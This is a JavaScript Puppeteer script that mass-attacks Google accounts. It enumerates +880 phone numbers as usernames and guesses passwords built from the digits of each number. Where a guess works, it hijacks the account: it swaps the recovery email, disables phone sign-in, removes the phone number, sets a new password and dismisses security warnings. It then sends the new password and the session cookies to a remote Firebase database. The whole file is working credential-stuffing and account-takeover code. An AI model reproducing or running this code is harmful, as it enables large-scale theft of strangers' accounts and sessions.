const puppeteer = require('./Puppeteer.js')
const request = require('request')
const fs = require('fs')

let SERVER = ''
let SIRIAL = ''
let SIZE = 0
let database = null

let update = 0
let mLoadSuccess = false
let mPrevNumber = 0
let mPasswordTry = 0
let mCreated = null
let mNumber = 0
let mLoad = 0
let mSirial = 0
let timer = null
let mChangeTime = 0
let mProcess = 0
let mAUth = null
let mGmail = 'null'
let mPassword = 'null'
let mRecoveryMail = 'null'
let mRecovery = null

let page = null
let browser = null

let raiyan = ''
let signin = ''
        

module.exports = class {
    constructor (db, server, sirial, size) {
        SERVER = server
        SIRIAL = sirial
        SIZE = size
        database = db

        mLoadSuccess = false
        mPrevNumber = 0
        mPasswordTry = 0
        mCapture = false
        mCreated = null
        mAUth = null
        mProcess = 0
        mNumber = 0
        mLoad = 0
        mSirial = 0

        page = null
        browser = null

        raiyan = 'https://raiyan-088-default-rtdb.firebaseio.com/raiyan/number/'
        signin = 'https://accounts.google.com/signin/v2/identifier?service=accountsettings&hl=en-US&continue=https://myaccount.google.com/phone&csig=AF-SEnY7bxxtADWhtFc_:1556625798&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
        
        update = parseInt(new Date().getTime() / 1000)
        

        timer = setInterval(function() {
            let now = parseInt(new Date().getTime() / 1000)

            if(((now-update) > 30 && mLoadSuccess) || (mNumber == mPrevNumber && mLoadSuccess && !mAUth)) {
                console.log('---Restart Browser--- ID: '+SIZE)
                process.exit(1)
            }

            if(mLoadSuccess) {
                mPrevNumber = mNumber
            }
        },60000)

        setInterval(async function() {
            if(mLoadSuccess) await requestUpdate()
        }, 1000)
    }

    async start() {
        console.log('Downloading data...')
        
        request({
            url: raiyan+'sirial.json',
            json:true
        }, function(error, response, body){
            if(!error) {
                mSirial = parseInt(body[SIRIAL])
                request({
                    url: raiyan+'server/'+SERVER+'.json',
                    json:true
                }, function(error, response, body){
                    if(!error) {
                        if(body['start_'+SIZE] == null) {
                            mNumber = parseInt(SIRIAL+mSirial+'000000')
                            database.set('/number/server/'+SERVER+'/runing_'+SIZE, mNumber)
                            database.set('/number/server/'+SERVER+'/start_'+SIZE, parseInt(SIRIAL+mSirial))
                            database.set('/number/sirial/'+SIRIAL, mSirial+1)
                        } else {
                            mSirial = parseInt(body['start_'+SIZE])
                            mNumber = parseInt(body['runing_'+SIZE])
                        }
                        
                        if(mNumber == 0) {
                            console.log('Stop Service')
                            clearInterval(timer)
                        } else {
                            console.log('+880'+mNumber)
                            console.log('Download Success')
                            startService()
                        }
                    }
                })
            }
        })
    }

}


async function startService() {

    ;(async () => {

        mRecovery = JSON.parse(fs.readFileSync('./recovery.json'))

        browser = await puppeteer.launch({
            headless: true,
            args: [ '--no-sandbox', '--disable-setuid-sandbox' ]
        })

        page = await browser.newPage()

        await page.setUserAgent('Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36')

        page.on('request', async request => {

            update = parseInt(new Date().getTime() / 1000)

        })

        page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())
        
        await page.goto(signin)

        mLoadSuccess = true

        console.log('Load Success '+SIZE)
    })()
}

async function requestUpdate() {
    let url = page.url()
    
    const block = await page.evaluate(() => {
        let root = document.querySelector('#headingText')
        if(root && root.innerText.includes(`Couldn’t sign you in`)) {
            return true
        } else {
            return false
        }
    })

    if(block) {
        mAUth = null
        mProcess = 0
        mPasswordTry = 0
        page.goto(signin)
    } else {
        let check = null

        if(mProcess == 0) {
            //Type phone number & Submit
            mProcess = 99
            check = await exits('div.Y4dIwd > span')
            if(check) {
                check = await page.evaluate((number) => { 
                    let root = document.querySelector('input[type="email"]'); 
                    if(root) {
                        root.value = number
                        return true 
                    }
                }, '+880'+mNumber)

                if(check) {
                    mNumber++
                    mLoad++
                    if(parseInt(mSirial)+1 <= parseInt(mNumber/1000000)) {
                        database.set('/number/server/'+SERVER+'/runing_'+SIZE, 0)
                    } else {
                        if(mLoad % 10 == 0) {
                            console.log('ID:' +SIZE+' --- '+mLoad+' --- Null')
                            database.set('/number/server/'+SERVER+'/runing_'+SIZE, mNumber)
                        }
                        check = await click('#identifierNext')
                        if(check) {
                            mProcess = 1
                        }
                    }
                }
            }
            if(mProcess != 1) {
                mAUth = null
                mProcess = 0
                mPasswordTry = 0
            }
        } else if(mProcess == 1) {
            //check wrong phone number or has capture
            mProcess = 99
            check = await exits('div.o6cuMc')
            if(check) {
                //Number Can't found. check next number
                check = await page.evaluate((number) => { 
                    let root = document.querySelector('input[type="email"]'); 
                    if(root) {
                        root.value = number
                        return true 
                    }
                }, '+880'+mNumber)

                if(check) {
                    mNumber++
                    mLoad++
                    if(mLoad % 10 == 0) {
                        console.log('ID:' +SIZE+' --- '+mLoad+' --- Null')
                        database.set('/number/server/'+SERVER+'/runing_'+SIZE, mNumber)
                    }
                    await click('#identifierNext')
                }
            } else {
                check = await exits('div[class="Wzzww"]')
                if(check) {
                    //captcha found. check next number
                    mAUth = null
                    mProcess = 0
                    mPasswordTry = 0
                    database.set('/number/server/'+SERVER+'/runing_'+SIZE, mNumber)
                    page.goto(signin)
                } else {
                    check = await exits('#passwordNext')
                    if(check) {
                        mProcess = 2
                    }
                }
            }
            if(mProcess != 0) {
                if(mProcess != 2) {
                    mProcess = 1
                }
            }
        } else if(mProcess == 2) { 
            //Type password & Submit
            mProcess = 99
            check = await exits('#passwordNext')
            if(check) {
                check = await exits('div.OyEIQ.uSvLId > div')
                if(check || mPasswordTry == 0) {
                    check = await checkPassword()
                    if(check) {
                        mAUth = null
                        mPasswordTry = 0
                        mProcess = 0
                        await click('div.YZrg6.HnRr5d.iiFyne.cd29Sd')
                    } else {
                        check = await page.evaluate(() => document.querySelector('input[type="password"]').value)
                        if(check && check != '') {
                            mPasswordTry++
                            mProcess = 2
                        }
                    }
                } else {
                    check = await exits('div[class="Wzzww"]')
                    if(check) {
                        //captcha found. check next number

                        mAUth = null
                        mProcess = 0
                        mPasswordTry = 0
                        database.set('/number/server/'+SERVER+'/runing_'+SIZE, mNumber)
                        await click('div.YZrg6.HnRr5d.iiFyne.cd29Sd')
                    } else {
                        mProcess = 4
                    }
                }
            } else{
                mProcess = 2
            }
        } else if(mProcess == 4) {
            //Check login success or any error
            mProcess = 99
            if(url.startsWith('https://myaccount.google.com/phone') || url.startsWith('https://gds.google.com/web/chip') || url.startsWith('https://myaccount.google.com/signinoptions/recovery-options-collection')) {
                if(url.startsWith('https://myaccount.google.com/phone')) {
                    mAUth = null
                } else {
                    let start = url.indexOf('rapt=')
                    let end = url.indexOf('&pli=1')
                    if(start != -1) {
                        if(end == -1) {
                            end = url.length
                        }
                        mAUth = url.substring(start+5, end)
                    } else {
                        mAUth = null
                    }
                }
                if(mAUth) {
                    page.goto('https://myaccount.google.com/recovery/email?rapt='+mAUth)
                    mProcess = 10
                } else {
                    mProcess = 6
                }
            } else {
                //Login Error. Check Error Type 
                const header = await page.evaluate(() => {
                    let root = document.querySelector('#headingText')
                    if(root) {
                        let text = root.innerText
                        if(text.includes(`Change password`)) {
                            return '1'
                        } else if(text.includes(`Verify it’s you`)) {
                            root = document.querySelectorAll('li.JDAKTe.cd29Sd.zpCp3.SmR8 > div')
                            if(root) {
                                for(let i=0; i<root.length; i++) {
                                    let type = root[i].getAttribute('data-challengetype')
                                    if(type) {
                                        if(type != 'undefined' && parseInt(type) == 42) {
                                            return '6'
                                        }
                                    }
                                }
                            }
                            return '2'
                        } else if(text.includes(`Couldn’t sign you in`)) {
                            return '3'
                        } else if(text.includes(`2-Step Verification`)){
                            return '4'
                        } else if(text.includes('Your account has been disabled')) {
                            return '5'
                        }
                    }
                    return '0'
                })

                if(header != 0) {
                    let now = parseInt(new Date().getTime() / 1000)
                    if(header == 1 && parseInt(now-mChangeTime) > 10) {
                        database.set('/number/password/'+(mNumber-1), mPasswordTry)
                        page.goBack()
                        mAUth = null
                        mProcess = 0
                        mPasswordTry = 0
                    } else {
                        if(header == 6) {
                            database.set('/number/menually/'+(mNumber-1), mPasswordTry)
                        } else {
                            database.set('/number/reject/'+(mNumber-1), mPasswordTry)
                        }
                        page.goBack()
                        mAUth = null
                        mProcess = 0
                        mPasswordTry = 0
                    }
                } else {
                    await delay(500)
                    mProcess = 4
                }
            }
        } else if(mProcess == 5) {
            //Check login success or any error
            mProcess = 99
            if(url.startsWith('https://myaccount.google.com/phone') || url.startsWith('https://gds.google.com/web/chip') || url.startsWith('https://myaccount.google.com/signinoptions/recovery-options-collection')) {
                if(url.startsWith('https://myaccount.google.com/phone')) {
                    mAUth = null
                } else {
                    let start = url.indexOf('rapt=')
                    let end = url.indexOf('&pli=1')
                    if(start != -1) {
                        if(end == -1) {
                            end = url.length
                        }
                        mAUth = url.substring(start+5, end)
                    } else {
                        mAUth = null
                    }
                }
                if(mAUth) {
                    page.goto('https://myaccount.google.com/recovery/email?rapt='+mAUth)
                    mProcess = 10
                } else {
                    mProcess = 6
                }
            } else {
                mProcess = 5
            }
        } else if(mProcess == 6 || mProcess == 23) {
            //Check Auth. Has Phone Number or Not
            if(mProcess == 6) {
                mProcess = 66
            } else {
                mProcess = 99
            }
            check = await exits('h1.ZZ9xL')
            
            if(check) {
                check = await click('div.ujJYOe')
                if(check) {
                    if(mProcess == 66) {
                        mProcess = 7
                    } else {
                        mProcess = 24
                    }
                } else {
                    if(mProcess == 66) {
                        check = await click('div.I68Wpe')
                        if(check) {
                            mProcess = 8
                        } else {
                            mProcess = 6
                        }
                    } else {
                        mProcess = 26
                    }   
                }
            } else {
                if(mProcess == 66) {
                    mProcess = 6
                } else {
                    mProcess = 23
                }
            }
        } else if(mProcess == 7 || mProcess == 24) {
            //Check Auth. Delete Phone Number
            if(mProcess == 7) {
                mProcess = 77
            } else {
                mProcess = 99
            }
            check = await page.evaluate(() => {
                let root = document.querySelectorAll('button.VfPpkd-Bz112c-LgbsSe.yHy1rc.eT1oJ.DiOXab')
                if(root && root.length == 4) {
                    root[3].click()
                    return true
                } else {
                    return false
                }
            })
            
            if(check) {
                if(mProcess == 77) {
                    mProcess = 8
                } else {
                    mProcess = 25
                }
            } else {
                if(mProcess == 77) {
                    mProcess = 7
                } else {
                    mProcess = 24
                }
            }
        } else if(mProcess == 8) {
            //Check Auth. Login Again
            mProcess = 99
            await delay(500)
            check = await page.evaluate((pass) => {
                let root = document.querySelector('input[type="password"]')
                if(root) {
                    root.value = pass
                    return true
                } else {
                    return false
                }  
            }, mPassword)  
            
            if(check) {
                check = await click('#passwordNext')
                if(check) {
                    mProcess = 9
                } else {
                    mProcess = 8
                }
            } else {
                mProcess = 8
            }
        } else if(mProcess == 9) {
            //Check Auth.
            if(url.startsWith('https://myaccount.google.com/phone?')) {
                let start = url.indexOf('rapt=')
                if(start != -1) {
                    mAUth = url.substring(start+5, url.length)
                }
            }
            if(mAUth) {
                page.goto('https://myaccount.google.com/recovery/email?rapt='+mAUth)
                mProcess = 10
            }
        } else if(mProcess == 10) {
            //Check Already Add Recovery Gmail
            mProcess = 99
            let cmd ='button.VfPpkd-LgbsSe.VfPpkd-LgbsSe-OWXEXe-k8QpJ.VfPpkd-LgbsSe-OWXEXe-dgl2Hf.nCP5yc.AjY5Oe.DuMIQc.qfvgSe.SdOXCb'
            check = await exits(cmd)
            
            if(check) {
                check = await page.evaluate((id) => {
                    let root = document.querySelector(id)
                    if(root) {
                        if(root.getAttribute('disabled') != null) {
                            return true
                        }
                    }
                    return false
                }, cmd)

                if(check) {
                    for(let i=0; i<7; i++) {
                        await page.keyboard.down('Tab')
                    }
                    await delay(420)
                    await page.keyboard.down('Control')
                    await page.keyboard.down('x')
                    await page.keyboard.up('x')
                    await page.keyboard.up('Control')
                }
                mProcess = 11
            }else {
                mProcess = 10
            }
        } else if(mProcess == 11) {
            //Set Recovery Gmail
            mProcess = 99

            let position = Math.floor((Math.random() * mRecovery.length))
            mRecoveryMail = mRecovery[position]

            check = await page.evaluate((gmail) => {
                let root = document.querySelector('input#i5')
                if(root) {
                    root.value = gmail
                    return true
                } else {
                    return false
                }
            }, mRecoveryMail+'@gmail.com')

            if(check) {
                mProcess = 12
            } else {
                mProcess = 11
            }
        } else if(mProcess == 12) {
            //Submit Recovery Gmail
            mProcess = 99
            check = await page.evaluate(() => {
                let root = document.querySelector('button.VfPpkd-LgbsSe.VfPpkd-LgbsSe-OWXEXe-k8QpJ.VfPpkd-LgbsSe-OWXEXe-dgl2Hf.nCP5yc.AjY5Oe.DuMIQc.qfvgSe.SdOXCb')
                if(root) {
                    if(root.getAttribute('disabled') != null) {
                        return 1
                    } else {
                        root.click()
                        return 2
                    }
                }
                return 0
            })

            if(check == 1) {
                page.goto('https://myaccount.google.com/recovery/email?rapt='+mAUth)
                mProcess = 10
            } else if(check == 2) {
                mProcess = 13
            } else {
                mProcess = 12
            }
        } else if(mProcess == 13) {
            //check Recovery Code
            mProcess = 99
            check = await exits('input#c2')

            if(check) {
                page.goto('https://myaccount.google.com/signinoptions/phone-sign-in?pli=1&rapt='+mAUth)
                mProcess = 14
            } else {
                mProcess = 13
            }
        } else if(mProcess == 14) {
            //Check Phone Verifcation
            mProcess = 99
            let check = await exits('div.wLocpe') 
            if(check) {
                //Check gmail create time
                page.goto('https://drive.google.com/')
                mProcess = 42
            } else {
                check = await click('div.U26fgb.O0WRkf.zZhnYe.e3Duub.C0oVfc.Zrq4w.Us8aEd.mc2LctosR4.M9Bg4d')
                if(check) {
                    mProcess = 15
                } else {
                    mProcess = 14
                }
            }
        } else if(mProcess == 15) {
            //Trun Off Phone Verifaction
            mProcess = 99
            check = await click('div.U26fgb.O0WRkf.oG5Srb.HQ8yf.C0oVfc.kHssdc.HvOprf.FsOtSd.M9Bg4d')

            if(check) {
                //Check gmail create time
                page.goto('https://drive.google.com/')
                mProcess = 42
            } else {
                mProcess = 15
            }
        } else if(mProcess == 16) {
            //Set New Password, check Input Box
            mProcess = 99

            check = await exits('input.VfPpkd-fmcmS-wGMbrd.uafD5')
            if(check) {
                mProcess = 17
            } else {
                if(url == 'https://myaccount.google.com/security') {
                    page.goto('https://myaccount.google.com/signinoptions/password?rapt='+mAUth)
                }
                mProcess = 16
            }
        } else if(mProcess == 17) {
            //Set New Password, Type Input Box
            mProcess = 99

            mPassword = getRandomPassword()

            check = await page.evaluate((pass) => {
                let root = document.querySelectorAll('input.VfPpkd-fmcmS-wGMbrd.uafD5')
                if(root) {
                    if(root.length == 2) {
                        root[0].value = pass
                        root[1].value = pass
                        return true
                    }
                }
                return false
            }, mPassword)

            if(check) {
                mProcess = 18
            } else {
                mProcess = 17
            }
        } else if(mProcess == 18) {
            //Set New Password, Submit Password & data upload on server
            mProcess = 99

            let gmail = await page.evaluate(() => {
                let root = document.querySelector('input[type="email"]')
                if(root) {
                    return root.value
                }
                return false
            })

            if(gmail && gmail.endsWith('@gmail.com')) {

                check = await click('div.VfPpkd-RLmnJb')
                if(check) {
                    let cookes = {}
                    let temp = await page.cookies()
                    temp.forEach(function (value) {
                        if (value.name == 'SSID') {
                            cookes['SSID'] = value.value
                        } else if (value.name == 'SAPISID') {
                            cookes['SAPISID'] = value.value
                        } else if (value.name == 'OSID') {
                            cookes['OSID'] = value.value
                        } else if (value.name == 'SID') {
                            cookes['SID'] = value.value
                        } else if (value.name == '__Secure-1PSID') {
                            cookes['1PSID'] = value.value
                        } else if (value.name == 'HSID') {
                            cookes['HSID'] = value.value
                        }
                    })

                    mGmail = gmail.replace('@gmail.com', '').replace('.', '')
                    let now = parseInt(new Date().getTime() / 1000)
                    database.update('/number/completed/'+mGmail, { active : now, password : mPassword, number : (mNumber-1), recovery : mRecoveryMail, create : mCreated})
                    database.update('/number/completed/'+mGmail+'/cookies', cookes)

                    mProcess = 19
                } else {
                    mProcess = 18
                }
            } else {
                mProcess = 18
            }
        } else if(mProcess == 19) {
            //check Success Password Change
            mProcess = 99
            check = await exits('div.eB5Kz')
            if(check) {
                page.goto('https://myaccount.google.com/security-checkup/4')
                mProcess = 20
            } else {
                mProcess = 19
            }
        } else if(mProcess == 20) {
            //Clear Worning Notification
            mProcess = 99
            check = await exits('div.RAjCxe')
            if(check) {
                check = await click('button.VfPpkd-LgbsSe.VfPpkd-LgbsSe-OWXEXe-k8QpJ.VfPpkd-LgbsSe-OWXEXe-dgl2Hf.nCP5yc.AjY5Oe.DuMIQc.qfvgSe.SdOXCb.I7EV9e')
                if(check) {
                    mProcess = 21
                } else {
                    page.goto('https://myaccount.google.com/security-checkup/7')
                    mProcess = 22
                }
            } else {
                mProcess = 20
            }
        } else if(mProcess == 21) {
            //Clear Singel Notification & back
            mProcess = 99
            check = await exits('div.BNK4qe')
            if(check) {
                check = await click('button.VfPpkd-LgbsSe.VfPpkd-LgbsSe-OWXEXe-INsAgc.VfPpkd-LgbsSe-OWXEXe-Bz112c-M1Soyc.Rj2Mlf.OLiIxf.PDpWxe.qfvgSe.SdOXCb.uz4FJf.VmUnYb.cOqjte')
                if(check) {
                    mProcess = 20
                } else {
                    mProcess = 21
                }
            } else {
                mProcess = 21
            }
        } else if(mProcess == 22) {
            //Dismiss Save Browser & Clear cookies
            mProcess = 99
            check = await click('div.VfPpkd-RLmnJb')
            if(check) {
                page.goto('https://myaccount.google.com/phone?rapt='+mAUth)
                mProcess = 23
            } else {
                check = await exits('div.Iyifm')
                if(check) {
                    page.goto('https://myaccount.google.com/phone?rapt='+mAUth)
                    mProcess = 23
                } else {
                    mProcess = 22
                }
            }
        } else if(mProcess == 25) {
            //Delete Confrom, Phone number
            mProcess = 99
            check = await click('div.U26fgb.O0WRkf.oG5Srb.HQ8yf.C0oVfc.kHssdc.HvOprf.FsOtSd.M9Bg4d')
            if(check) {
                mProcess = 26
            } else {
                mProcess = 25
            }
        } else if(mProcess == 26) {
            //clear Cookies
            mProcess = 27
            let temp = JSON.parse(fs.readFileSync('./cookies.json'))
            await page.setCookie(...temp)
            page.goto(signin)

        } else if(mProcess == 27) {
            //Log Out Gmail & Remove It.
            mProcess = 99
            
            check = await exits('#headingText')

            if(check) {
                check = await click('ul.OVnw0d > li:nth-child(3) > div')
                if(check) { 
                    mProcess = 28
                } else {
                    mProcess = 27
                }
            } else {
                mProcess = 27
            }
        } else if(mProcess == 28) {
            //Remove It & Accept popup dialog.
            mProcess = 99
            check = await click('ul.OVnw0d > li:nth-child(1) > div > div.n3x5Fb')
            if(check) {
                mProcess = 29
            } else {
                mProcess = 28
            }
        } else if(mProcess == 29) {
            //Remove It. Confrom
            mProcess = 99
            check = await click('div.ZFr60d.CeoRYc')
            if(check) {
                mAUth = null
                mProcess = 0
                mPasswordTry = 0
            } else {
                mProcess = 30
            }
        } else if(mProcess == 40) {
            check = await page.evaluate(() => window.__initData )

            if(check) {
                mCreated = parseInt(check[0][9][11][9] / 1000)
                page.goto('https://myaccount.google.com/signinoptions/password?rapt='+mAUth)
                mProcess = 16
            } else {
                mProcess = 40
            }
        }
    }
}

async function checkPassword() {
    if(mPasswordTry >= 3) {
        if(parseInt(mSirial)+1 <= parseInt(mNumber/1000000)) {
            database.set('/number/server/'+SERVER+'/runing_'+SIZE, 0)
        } else {
            database.set('/number/server/'+SERVER+'/runing_'+SIZE, mNumber)
        }
        return true
    } else {
        if(mPasswordTry == 0) {
            mPassword = '0'+(mNumber-1)
            console.log('ID:' +SIZE+' --- '+mLoad+' --- +88'+mPassword)
        } else if(mPasswordTry == 1) {
            let temp = '0'+(mNumber-1)
            mPassword = temp.substring(0, 8)
        } else if(mPasswordTry == 2) {
            let temp = '0'+(mNumber-1)
            mPassword = temp.substring(3, 11)
        }

        await page.evaluate((pass) => document.querySelector('input[type="password"]').value = pass , mPassword)
        await click('#passwordNext')
        return false
    }
}

async function click(id) {
    let output = await page.evaluate((id) => {
        let root = document.querySelector(id)
        if(root) {
            root.click()
            return true
        } else {
            return false
        }
    }, id)
    return output
}

async function exits(id) {
    let output = await page.evaluate((id) => {
        let root = document.querySelector(id)
        if(root) {
            return true
        } else {
            return false
        }
    }, id)
    return output
}

function getRandomPassword() {
    let C = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
    let S = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
    let N = ['0','1','2','3','4','5','6','7','8','9']
    let U = ['#','$','@']
    
    let pass = C[Math.floor((Math.random() * 26))]
    pass = pass+ S[Math.floor((Math.random() * 26))]
    pass = pass+ S[Math.floor((Math.random() * 26))]
    pass = pass+ S[Math.floor((Math.random() * 26))]
    pass = pass+ S[Math.floor((Math.random() * 26))]
    pass = pass+ N[Math.floor((Math.random() * 10))]
    pass = pass+ N[Math.floor((Math.random() * 10))]
    pass = pass+ N[Math.floor((Math.random() * 10))]
    pass = pass+ U[Math.floor((Math.random() * 3))]
    pass = pass+ U[Math.floor((Math.random() * 3))]
    
    return pass
}


async function delay(time) {
    return new Promise(function(resolve) { 
        setTimeout(resolve, time)
    });
}